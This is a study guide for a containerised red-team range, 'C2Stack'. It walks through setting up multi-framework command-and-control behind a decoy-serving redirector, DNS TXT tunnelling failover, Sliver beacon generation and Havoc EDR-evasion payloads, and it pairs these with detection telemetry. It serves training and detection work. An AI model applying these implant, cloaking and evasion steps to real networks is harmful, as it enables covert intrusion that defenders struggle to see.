# C2Stack Practice & Study Guide
### *A Hands-On Field Guide to Modern Command & Control (C2), Fronting Infrastructure, and Egress Analysis*

---

## 1. Executive Overview & Real-World Value

In modern adversary simulation, red teaming, and threat hunting, **Command and Control (C2)** is the nervous system of an engagement. However, deploying raw C2 teamservers directly on public IP addresses is an outdated, high-risk practice. Modern operators and advanced persistent threats (APTs) rely on **multi-tier redirector architectures**, **covert egress channels**, and **diversified payload frameworks** to ensure resilience, OPSEC shielding, and persistence.

**C2Stack** provides a containerized, reproducible practice range that models enterprise-grade C2 infrastructure with zero hypervisor overhead.

```
┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                       C2STACK VALUE PROPOSITION                                  │
├──────────────────────────────────────┬───────────────────────────────────────────────────────────┤
│ 🎯 FOR OFFENSIVE PRACTITIONERS        │ 🛡️ FOR DEFENDERS & DFIR INVESTIGATORS                     │
├──────────────────────────────────────┼───────────────────────────────────────────────────────────┤
│ • Master 5 distinct C2 paradigms     │ • Capture raw network & host telemetry (Zeek/Sysmon)     │
│ • Practice Apache header-based front │ • Analyze high-entropy DNS TXT tunneling patterns         │
│ • Hands-on DNS covert channels       │ • Dissect in-memory evasion & sleep masking               │
│ • Automate multi-transport failovers │ • Build and evaluate Sigma/Suricata detection rules       │
└──────────────────────────────────────┴───────────────────────────────────────────────────────────┘
```

---

## 2. Infrastructure Architecture & Mental Model

```
                                  VICTIM NETWORK (CADRE Range / Standalone Host)
                                                │
                                                ▼
                   ┌───────────────────────────────────────────────────────────┐
                   │            1. EDGE GATEWAY (Apache Redirector)            │
                   │  Port 80 (c2_edge) · Header: X-Request-ID: cadre-c2      │
                   └───────────────┬───────────────────────────┬───────────────┘
                                   │                           │
                        [NO/INVALID HEADER]              [VALID HEADER]
                                   │                           │
                                   ▼                           ▼
                        ┌─────────────────────┐    ┌───────────────────────────┐
                        │   CloudEdge CDN     │    │  2. ISOLATED c2_core NET  │
                        │   Benign Decoy      │    │  (Zero Internet Egress)   │
                        └─────────────────────┘    └─────────────┬─────────────┘
                                                                 │
         ┌─────────────────────┬───────────────────┬─────────────┴───────┬─────────────────────┐
         ▼                     ▼                   ▼                     ▼                     ▼
┌─────────────────┐   ┌─────────────────┐ ┌─────────────────┐   ┌─────────────────┐   ┌─────────────────┐
│   MERIDIAN C2   │   │    HAVOC C2     │ │    SLIVER C2    │   │   ADAPTIX C2    │   │    MYTHIC C2    │
│  :8080 (HTTP)   │   │  :80 (HTTP C2)  │ │  :80 (HTTP C2)  │   │  :80 (HTTP C2)  │   │  :80 (HTTP C2)  │
│  :5353/udp (DNS)│   │  :40056 (TS)    │ │  :31337 (gRPC)  │   │  :4321 (Qt TS)  │   │  :7443 (UI)     │
└────────┬────────┘   └────────┬────────┘ └────────┬────────┘   └────────┬────────┘   └────────┬────────┘
         │                     │                   │                     │                     │
         └─────────────────────┴───────────────────┼─────────────────────┴─────────────────────┘
                                                   ▼
                                  3. OPERATOR WORKSTATION (Kali Linux)
```

### The Three Operational Layers:

1. **The Edge Redirector Layer (`c2_edge`)**:
   - The only public-facing container.
   - Evaluates the incoming `X-Request-ID` header. If missing or altered (e.g., security researchers, internet scanners, or automated blue-team scrapers), Apache returns a legitimate **CloudEdge CDN Decoy Page**.
   - Valid requests are reverse-proxied over the internal Docker network to the matching framework according to URI prefix.

2. **The Isolated Core Layer (`c2_core`)**:
   - Internal bridge network with `internal: true` (zero direct internet route).
   - Teamservers cannot accidentally leak their real public IP or establish uncontrolled outbound connections.

3. **The Multi-Framework Matrix**:
   - Five purpose-built C2 frameworks providing a spectrum of capabilities from ultra-lightweight DNS tunneling to deep Windows kernel evasion.

---

## 3. Framework Selection & Comparison Matrix

| Framework | Core Strength | Payload Architecture | Primary Transport | Operator Interface | Real-World Use Case |
|---|---|---|---|---|---|
| **Meridian** | Ultra-lightweight, Zero-dep | Pure Go (Stdlib only) | **HTTP(S) + Chunked DNS TXT** | Python CLI / TUI | Restricted network egress & DNS covert channels |
| **Havoc** | In-memory Windows Evasion | C++ Demon (Syscalls / Ekko) | HTTP / HTTPS / SMB | C++ Qt5 Desktop GUI | High-security Windows endpoints & EDR evasion |
| **Sliver** | Lateral Movement & Armory | Go / C# / Rust Implants | mTLS / WireGuard / HTTP | Go CLI / gRPC | General campaign operations & post-exploitation |
| **Adaptix** | Multiplayer Operations | Go/C++ Beacon & Gopher | HTTP/S / DNS / SMB / TCP | C++ Qt5 Desktop GUI | Multi-operator red team collaborations |
| **Mythic** | Enterprise Microservices | Modular Agents (Apollo/Poseidon) | Profile-driven (HTTP/WS) | React Web Browser UI | Multi-platform enterprise simulation |
| **Loki** | Living-off-the-Cloud | PowerShell / .NET | Azure Blob Storage | CLI / Azure SDK | Cloud-first & Azure Hybrid AD environments |

---

## 4. Step-by-Step Standalone Setup

### Step 1: Environment Initialization

1. Clone or navigate to the `C2Stack/Docker` directory:
   ```bash
   cd C2Stack/Docker
   ```
2. Copy the environment configuration:
   ```bash
   cp .env.example .env
   ```
3. Review key settings in `.env`:
   - `REDIRECTOR_HTTP_PORT=80` (or `8080` if 80 is occupied)
   - `C2_HEADER_NAME=X-Request-ID`
   - `C2_HEADER_VALUE=cadre-c2`
   - `MERIDIAN_DNS_PORT=5353`

### Step 2: Stack Bring-Up

**Windows (PowerShell 7+):**
```powershell
.\docker-bootstrap.ps1               # Default: Redirector + Meridian + Sliver + Havoc
.\docker-bootstrap.ps1 -Mythic       # Include Mythic
.\docker-bootstrap.ps1 -Adaptix      # Include Adaptix
.\docker-bootstrap.ps1 -All          # All 5 frameworks
```

**Linux / macOS (Bash):**
```bash
./docker-bootstrap.sh               # Default: Redirector + Meridian + Sliver + Havoc
./docker-bootstrap.sh --mythic      # Include Mythic
./docker-bootstrap.sh --adaptix     # Include Adaptix
./docker-bootstrap.sh --all         # All 5 frameworks
```

### Step 3: Verifying the OPSEC Boundary

1. **Test the Decoy Page (Simulate a Scanner without the C2 header)**:
   ```bash
   curl -i http://localhost:80/
   ```
   *Expected Result*: Returns `HTTP/1.1 200 OK` serving the **CloudEdge CDN Global Edge Cache** decoy page.

2. **Test Header-Based Proxy Routing**:
   ```bash
   curl -i -H "X-Request-ID: cadre-c2" http://localhost:80/gateway/v1/telemetry/
   ```
   *Expected Result*: Returns HTTP response from the internal Meridian backend.

---

## 5. Hands-On Lab Exercises

### Lab Module 1: Meridian (DNS Covert Tunneling & Transport Failover)

**Objective**: Deploy a zero-dependency implant, establish C2 communication over HTTP, simulate a firewall block, and watch the implant automatically fail over to chunked DNS TXT tunneling.

```
┌────────────────────────────────────────────────────────────────────────┐
│ LAB 1: MERIDIAN AIR-GAP & DNS ESCAPE                                   │
│                                                                        │
│   [Target Host]                               [C2Stack Host]           │
│   ┌─────────────┐   1. HTTP Checkin (Blocked)   ┌─────────────────┐    │
│   │  parallax   │ ────────────────────────────▶ │    Redirector   │    │
│   │   implant   │                               │ (Drop / Reject) │    │
│   │             │   2. Auto Failover to DNS     └─────────────────┘    │
│   │             │ ────────────────────────────▶ ┌─────────────────┐    │
│   └─────────────┘       UDP 5353 (Base32 TXT)   │ Meridian DNS C2 │    │
│                                                 └─────────────────┘    │
└────────────────────────────────────────────────────────────────────────┘
```

#### Hands-On Steps:
1. **Locate Precompiled Implants**:
   The Meridian container automatically builds static binaries on startup located in `/opt/meridian/payloads/`:
   - `parallax-linux-amd64` (Linux ELF static)
   - `parallax-windows-amd64.exe` (Windows PE static)
2. **Execute Implant with Dual Transports**:
   On your test VM or target host:
   ```bash
   # Linux Target:
   export MERIDIAN_HTTP="http://<C2STACK_IP>:80/gateway/v1/telemetry"
   export MERIDIAN_DNS="<C2STACK_IP>:5353"
   export MERIDIAN_DNS_DOMAIN="c2.cadre.local"
   ./parallax-linux-amd64
   ```
3. **Interact via the Meridian Console**:
   Inside the Meridian container or via Kali CLI:
   ```bash
   docker compose exec -it meridian python3 -m meridian.cli
   ```
   - Run `sessions` to see the new connection.
   - Run `use <session_id>`
   - Run `exec whoami` or `shell uname -a`
   - Run `results` to view encrypted-at-rest execution output.
4. **Simulate Firewall Blocking**:
   Block outbound HTTP on the target host (`iptables -A OUTPUT -p tcp --dport 80 -j DROP`). Observe that the beacon loop automatically switches to chunked DNS TXT queries over UDP 5353 without session disruption.

---

### Lab Module 2: Sliver (Lateral Movement & In-Memory Execution)

**Objective**: Build an obfuscated Go beacon, route through the redirector prefix `/cloud/storage/objects`, and execute in-memory triage tools.

#### Hands-On Steps:
1. **Connect to the Sliver Teamserver**:
   On your Kali workstation:
   ```bash
   sliver-client
   ```
2. **Create the HTTP Listener**:
   ```sliver
   http -L <C2STACK_IP> -l 80 -n sliver-http
   ```
3. **Generate a Sliver Payload**:
   ```sliver
   generate beacon --http <C2STACK_IP>:80/cloud/storage/objects --os windows --arch amd64 --save ./beacon.exe
   ```
4. **Execute & Interact**:
   Deliver `beacon.exe` to a test host with the `X-Request-ID: cadre-c2` header configured.
   ```sliver
   beacons
   use <beacon_id>
   tasks
   execute-assembly /opt/tools/Seatbelt.exe -group=system
   ```

---

### Lab Module 3: Havoc (Windows Kernel & EDR Evasion)

**Objective**: Configure Havoc C++ Demon for memory evasion, direct syscalls, and sleep masking.

#### Hands-On Steps:
1. **Launch the Havoc GUI**:
   On Kali Linux:
   ```bash
   ./havoc client
   ```
   Connect to host `<C2STACK_IP>:40056` with credentials configured in Havoc profile.
2. **Configure HTTP Listener**:
   - Host: `<C2STACK_IP>`
   - Port: `80`
   - Path / Prefix: `/edge/cache/assets`
   - Headers: `X-Request-ID: cadre-c2`
3. **Generate Demon Payload**:
   - Select `x64 EXE` or `x64 DLL`.
   - Enable **Indirect Syscalls** and **Sleep Obfuscation (Ekko / Zilean)**.
4. **Execute & Validate**:
   Execute the Demon on Windows member servers (`mbr01` or `ws01`). Verify via Process Hacker / Process Explorer that executable memory regions remain masked during sleep cycles.

---

## 6. Real-World Defensive Telemetry & DFIR-Nexus Integration

When C2Stack is used against the CADRE range, it generates realistic blue-team telemetry across multiple sensor layers:

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        BLUE-TEAM TELEMETRY GENERATION MATRIX                           │
├───────────────────┬───────────────────────────────┬────────────────────────────────────┤
│ ARTIFACT LAYER    │ EVIDENCE PRODUCED             │ DFIR-NEXUS HUNTING QUERY / SIGMA   │
├───────────────────┼───────────────────────────────┼────────────────────────────────────┤
│ **DNS Server**    │ High-frequency TXT lookups    │ Query length > 50 chars, base32    │
│                   │ with subdomain entropy        │ regex: `^[A-Z2-7]{10,}\.c2\.`      │
├───────────────────┼───────────────────────────────┼────────────────────────────────────┤
│ **Web Proxy**     │ Regular HTTP beaconing with   │ Frequency / jitter analysis on     │
│                   │ static URI prefixes           │ `/gateway/v1/` and `/edge/cache/`  │
├───────────────────┼───────────────────────────────┼────────────────────────────────────┤
│ **Sysmon Host**   │ Event ID 1 (Process Create),  │ Suspicious parent-child spawns     │
│                   │ Event ID 3 (Network Connect)  │ (e.g. `rundll32.exe` making port 80)│
├───────────────────┼───────────────────────────────┼────────────────────────────────────┤
│ **Memory Dump**   │ In-memory beacon threads &    │ Volatility 3 `windows.malfind` &   │
│                   │ unbacked memory pages         │ YARA rules matching C2 signatures  │
└───────────────────┴───────────────────────────────┴────────────────────────────────────┘
```

---

## 7. Integration with the CADRE Lab Range

In the full **CADRE Platform**, C2Stack pairs directly with the 7-VM Active Directory lab (`192.168.77.0/24`):

1. **Campaign Execution**: RedStrike or custom operators trigger initial access (Campaign H) or lateral movement (Campaign C/D).
2. **Callback Ingress**: Target VMs (`dc01`, `mbr01`, `ws01`) call back into the Docker host via `192.168.77.1` (vmnet2 adapter) on port 80/5353.
3. **Investigation & Triage**: DFIR-Nexus ingests Windows EVTX, memory dumps, and network PCAPs captured during C2 execution to reconstruct the attack timeline.

---

## 8. Summary Checklist for Operators

- [ ] **Docker Host Verified**: Docker Desktop running, `.env` file created and customized.
- [ ] **Redirector Active**: Port 80 listening; decoy page verified on raw `curl`.
- [ ] **Framework Selected**: Picked appropriate C2 based on engagement objectives (Meridian for DNS, Havoc for EDR evasion, Sliver for lateral movement).
- [ ] **Header Configured**: Guaranteed payloads include `X-Request-ID: cadre-c2`.
- [ ] **Persistence Checked**: Confirmed Docker named volumes (`meridian_data`, `sliver_data`, `havoc_data`) persist session state across container restarts.
